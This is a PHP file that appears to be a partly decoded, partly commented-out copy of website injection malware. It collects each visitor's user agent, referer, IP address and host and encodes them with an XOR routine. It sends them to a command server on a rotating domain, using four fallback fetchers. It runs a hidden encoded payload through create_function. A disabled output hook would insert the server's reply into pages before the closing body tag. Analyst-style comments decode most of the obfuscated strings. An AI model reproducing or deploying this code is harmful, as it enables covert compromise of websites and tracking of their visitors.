<?php


 function g_1($url) { 
     if (function_exists("file_get_contents") === false) { 
         return false; 
     }
     $buf = @file_get_contents($url); 
     if ($buf == "") { 
         return false; 
     }
     return $buf; 
 }   

function g_2($url) { 
    if (function_exists("curl_init") === false) {
        return false; 
    }
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    $res = curl_exec($ch); 
    curl_close($ch); 
    if ($res == "") { 
        return false; 
    }
    return $res; 
}

function g_3($url) { 
    if (function_exists("file") === false) { 
        return false; 
    }
    $inc = @file($url); 
    $buf = @implode("", $inc); 
    if ($buf == "")  {
        return false; 
    }
    return $buf; 
}

function g_4($url) { 
    if (function_exists("socket_create") === false) { 
        return false; 
    }
    
    $p = @parse_url($url);
    $host = $p["host"];
    
    if( !isset( $p["query"] ) ) {
        $p["query"]=""; 
    }
    
    $uri = $p["path"] . "?" . $p["query"];
    $ip1 = @gethostbyname($host);
    $ip2 = @long2ip(@ip2long($ip1));
    
    if ($ip1 != $ip2) {
        return false; 
    }
    
    $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    
    if (!@socket_connect($sock, $ip1, 80)) { 
        @socket_close($sock);
        return false; 
    }
    
    $req = "GET $uri HTTP/1.0\n";
    $req .= "Host: $host\n\n";
    socket_write($sock, $req);
    $buf = "";
    
    while ($t = socket_read($sock, 10000)) { 
        $buf .= $t; 
    }
    
    @socket_close($sock); 
    
    if ($buf == "") {
        return false;
    }
    
    list($m, $buf) = explode("\r\n\r\n", $buf); 
    
    return $buf;  
} 

function gtd ($url) { 
    $co = ""; 
    $co = @g_1($url); 
    
    if ($co !== false) {
        return $co; 
    }
    
    $co = @g_2($url); 
    
    if ($co !== false) {
        return $co; 
    }
    
    $co = @g_3($url); 
    
    if ($co !== false) {
        return $co;}
    
    $co = @g_4($url); 
    
    if ($co !== false) {
        return $co;
    }
    
    return ""; 
}

function k34($op,$text) { 
    return base64_encode(en2($text, $op));
}

function check212($param) { 
    if( !isset( $_SERVER[$param] ) ) {
        $a="non"; 
    } else if ($_SERVER[$param]=="") {
        $a="non"; 
    } else {
        $a = $_SERVER[$param];
    }
    
    return $a; 
}

function day212() { 
    $a=check212("HTTP_USER_AGENT");
    $b=check212("HTTP_REFERER");
    $c=check212("REMOTE_ADDR");
    $d=check212("HTTP_HOST");
    $e=check212("PHP_SELF");
    $domarr = array("33db9538","9507c4e8","e5b57288","54dfa1cb"); 
    
    if ( ($a=="non") or ($c=="non") or ($d=="non") or strrpos( strtolower($e),"admin" ) or (preg_match( "/" . implode( "|", array("google","slurp","msnbot","ia_archiver","yandex","rambler") ) . "/i", strtolower($a))) ) { 
        $o1 = ""; 
    } else { 
        $op = mt_rand(100000,999999);
        
        $g4 = $op ."?". urlencode( urlencode( k34($op,$a) .".". k34($op,$b) .".". k34($op,$c) .".". k34($op,$d) .".". k34( $op,$e) ) );
            
        $url = "http://". cqq(".com") ."/". $g4; 
    
        // $ca1 = en2( @gtd($url), $op); 
        
        // echo $ca1; // garbage...
        
        // $a1 = @explode("!NF0",$ca1); 
        
        if (sizeof($a1)>=2) {
            $o1 = $a1[1]; 
        } else {
            $o1 = ""; 
        }
    } 
    
    // echo $o1;
    
    return $o1; 
}

day212();

function cqq($qw) { 
    
    $domarr = array("33db9538", "9507c4e8", "e5b57288", "54dfa1cb"); 
    
    return random($domarr,$qw);

}

function random($arr,$qw) { 
    
    $g = "\x20\167\x2d\70\x36794587495086f963874,qq-82d94486e,r-86297186e94186d945,wq-874941874,s-87\x33\54\x67\75\x20\167\x2e\40\x72\73\x20\155\x2d\70"."6d944835,sq-873964872937873960\x38\66\x63\71\x35\61\x38\67\x34\42\x3b"; //  w-86794587495086f963874,qq-82d94486e,r-86297186e94186d945,wq-874941874,s-873,g= w. r; m-86d944835,sq-87396487293787396086c951874";
    $soy = "\x65\156\x32"; // en2
    $xx = "\x65\170\x70"."\154\x6f\144\x65"; // explode
    $ecx = "\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e"; // create_function  
    $scy = "\x73\164\x72\137\x72\145\x70\154\x61\143\x65"; // str_replace
    
    $a = $xx("|","\x5c\170\x7c\134\x31\174\x3d\42\x7c\42\x3b\44\x7c\44"); // Array
    
    $aa = $xx("|","8|9|-|,| "); // Array
    
    $mec = $ecx; // create_function
    
    // sizeof($a); // 5
    for( $i=0; $i < sizeof($a); $i++) {
        $g = $scy($aa[$i], $a[$i], $g); 
    }
    
    // echo $g; // $w="\x67\145\x74\150\x6f\163\x74";$qq="\x2d\144\x6e";$r="\x62\171\x6e\141\x6d\145";$wq="\x74\141\x74";$s="\x73";$g=$w.$r;$m="\x6d\144\x35";$sq="\x73\164\x72\137\x73\160\x6c\151\x74";
    
    // $w="\x67\145\x74\150\x6f\163\x74"; // gethost
    // $qq="\x2d\144\x6e"; // -dn
    // $r="\x62\171\x6e\141\x6d\145"; // byname
    // $wq="\x74\141\x74"; // tat
    // $s="\x73"; // s
    // $g=$w.$r; gethostbyname
    // $m="\x6d\144\x35"; // md5
    // $sq="\x73\164\x72\137\x73\160\x6c\151\x74"; // str_split
    
    $ecx("", "};$g//");    
    
    $mec("", $soy("\230\77\153\147\26\167\114\130\223\257\211\2\253\5\172\316\25\262\145\25\62\72\127\156\270\100\154\56\341\77\4\37\21\152\206\334\101\334\32\210\353\173\253\5\123\231\47\13\20",$scy));
    
    // echo "\230\77\153\147\26\167\114\130\223\257\211\2\253\5\172\316\25\262\145\25\62\72\127\156\270\100\154\56\341\77\4\37\21\152\206\334\101\334\32\210\353\173\253\5\123\231\47\13\20"; // ˜?kgwLX“¯‰«zÎ²e2:Wn¸@l.á?j†ÜAÜˆë{«S™'
    
    // create_function("", en2("\230\77\153\147\26\167\114\130\223\257\211\2\253\5\172\316\25\262\145\25\62\72\127\156\270\100\154\56\341\77\4\37\21\152\206\334\101\334\32\210\353\173\253\5\123\231\47\13\20",$scy));
    
    return $arr[rand((0.24-(0.03*8)),(0.1875*6))].$qw;
}

function en2($s, $q) { 

    $l="\x73\164\x72\154\x65\156";
    $p="\x70\141\x63\153";
    $r="\x73\165\x62\163\x74\162";
    $m="\x6d\144\x35"; 
    $g = ""; 
    
    while ($l($g)<$l($s)) { 
        $q = $p("H*",$m($g.$q."\x71\61\x77\62\x65\63\x72\64"));
        
        $g .= $r($q,0,8); 
    }
    
    return $s^$g; 

}

/*

function en2($s, $q) {

    $l = "\x73\164\x72\154\x65\156"; // strlen
    $p = "\x70\141\x63\153"; // pack
    $r = "\x73\165\x62\163\x74\162"; // substr
    $m = "\x6d\144\x35";  // md5
    $g = ""; 
    
    while( strlen("") < strlen($s) ) { 
        
        $q = pack( "H*",md5( $q ."\x71\61\x77\62\x65\63\x72\64" ) );
        
        // echo "\x71\61\x77\62\x65\63\x72\64"; // q1w2e3r4
        
        $g .= substr($q,0,8); 
    }
    
    // echo $s^$g;
    
    return $s^$g; 
}

*/
/*
    
if( !function_exists("pa22")) { 
    function pa22($v) { 
        Header("Content-Encoding: none");

        $p="\x70\162\x65\147\x5f"; // preg_
        $p1=$p."\155\x61\164\x63\150"; // preg_match
        $p2=$p."\162\x65\160\x6c\141\x63\145"; // preg_replace

        $t=dcoo($v);
        if($p1("/\<\/body/si",$t)) { 
            return $p2("/(\<\/body[^\>]*\>)/si", day212()."\n"."$"."1", $t,1); 
        } else { 
            if($p1("/\<\/html/si",$t)) { 
                return $p2("/(\<\/html[^\>]*\>)/si", day212()."\n"."$"."1", $t,1);
            } else { 
                return $t; 
            }
        }
    }
}

ob_start("pa22"); 

*/

?>